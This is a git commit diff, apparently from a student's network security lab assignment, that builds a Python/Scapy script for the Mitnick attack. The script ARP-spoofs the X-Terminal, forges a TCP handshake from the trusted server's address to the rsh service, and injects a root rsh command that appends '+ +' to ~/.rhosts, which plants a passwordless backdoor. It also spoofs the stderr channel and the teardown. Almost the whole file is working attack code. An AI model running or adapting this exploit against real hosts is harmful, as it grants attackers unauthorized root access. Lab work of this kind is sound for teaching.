673c82af2823f10ef8a16923a1354ae9e2417bdc
TTeuZ <pmla.luza@gmail.com>
2024-07-10 23:20:02 -0300

    [WIP] network security assignment

--- Segurança/mitnick_attack_lab/volumes/attack.py
+++ Segurança/mitnick_attack_lab/volumes/attack.py
@@ -1,15 +1,19 @@
-from scapy.all import *
+from scapy.all import ARP, IP, TCP, Raw, send, sr1, sniff, get_if_hwaddr
+from random import randint
+from time import sleep
 import subprocess
 import threading
 import re
-import os
 
 TRUSTED_SERVER = "10.9.0.6"
 X_TERMINAL = "10.9.0.5"
 ATTACKER_IP = "10.9.0.1"
 
 RSH_PORT = 514
-SRC_PORT = RandShort()
+SRC_PORT = 1023
+STDERR_PORT = 1022
+
+INIT_SEQ = randint(0, 42949672)
 
 # ---------------------------------------------- HELPERS -------------------------------------------------
 
@@ -37,32 +41,74 @@ def prep_env():
 
     print("Disabling send redirects")
     subprocess.run(["echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects"], shell=True, stdout=subprocess.PIPE)
-    time.sleep(2)
+    sleep(2)
 
 
 def spoof():
     arp_terminal = ARP(op=2, pdst=X_TERMINAL, hwdst=get_mac(X_TERMINAL), psrc=TRUSTED_SERVER)
-    arp_trusted = ARP(op=2, pdst=TRUSTED_SERVER, hwdst=get_mac(TRUSTED_SERVER), psrc=X_TERMINAL)
 
-    print("\nStart spoofing")
     while True:
-        send(arp_trusted, verbose=0)
         send(arp_terminal, verbose=0)
-        time.sleep(1)
+        sleep(1)
 
 
 if __name__ == "__main__":
     print("Preparing the machine environment...")
     prep_env()
 
+    # Getting interface name for sniffing
+    interface = get_interface_name()
+
+    print("Starting spoofing...")
     threading.Thread(target=spoof).start()
-    time.sleep(2)
+    sleep(2)
 
-    print(f"Faking 3-way handshake...")
-    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, flags="S")
+    print("Sending fake SYN package...")
+    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=INIT_SEQ, sport=SRC_PORT, dport=RSH_PORT, flags="S")
     syn_ack_package = sr1(syn_package, verbose=0)
-    tcp_layer = syn_ack_package.getlayer(TCP)
 
-    ack_packet = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, sport=tcp_layer.dport, flags='A', seq=tcp_layer.ack, ack=tcp_layer.seq + 1)
-    send(ack_packet, verbose=0)
-    print("Handshake completed")
+    print("SYN-ACK received. Sending ACK")
+    seq = INIT_SEQ + 1
+    ack = syn_ack_package.seq + 1
+    ack_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
+    send(ack_package, verbose=0)
+
+    print("Establishing RSH Session...")
+    rsh_payload = f"{STDERR_PORT}\x00root\x00root\x00echo \"+ +\" >> ~/.rhosts\x00".encode()
+    rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AP") / Raw(load=rsh_payload)
+    send(rsh_package, verbose=0)
+
+    print("Establishing session with RSH STDERR port...")
+    stderr_filter = f"tcp and src {X_TERMINAL}"
+    stderr_syn_package = sniff(filter=stderr_filter, iface=interface, count=1)[0]
+
+    seq = INIT_SEQ
+    ack = stderr_syn_package.seq + 1
+    stderr_syn_ack_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AS")
+    send(stderr_syn_ack_package, verbose=0)
+
+    print("Closing RSH connection...")
+    close_rsh_filter = f"tcp and src {X_TERMINAL} and src port {RSH_PORT}"
+    fin_rsh_package = sniff(filter=close_rsh_filter, iface=interface, count=1)[0]
+
+    seq = fin_rsh_package.ack
+    ack = fin_rsh_package.seq + 1
+    close_rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
+    send(close_rsh_package, verbose=0)
+
+    close_rsh_filter = f"tcp and src {X_TERMINAL} and src port {RSH_PORT}"
+    fin_rsh_package = sniff(filter=close_rsh_filter, iface=interface, count=1)[0]
+
+    seq = fin_rsh_package.ack
+    ack = fin_rsh_package.seq + 1
+    close_rsh_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AF")
+    send(close_rsh_package, verbose=0)
+
+    print("Closing STDERR connection...")
+    close_stderr_filter = f"tcp and src {X_TERMINAL} and src port {SRC_PORT}"
+    fin_stderr_package = sniff(filter=close_stderr_filter, iface=interface, count=1)[0]
+
+    seq = fin_stderr_package.ack
+    ack = fin_stderr_package.seq + 1
+    close_stderr_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF') / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AF")
+    send(close_stderr_package, verbose=0)
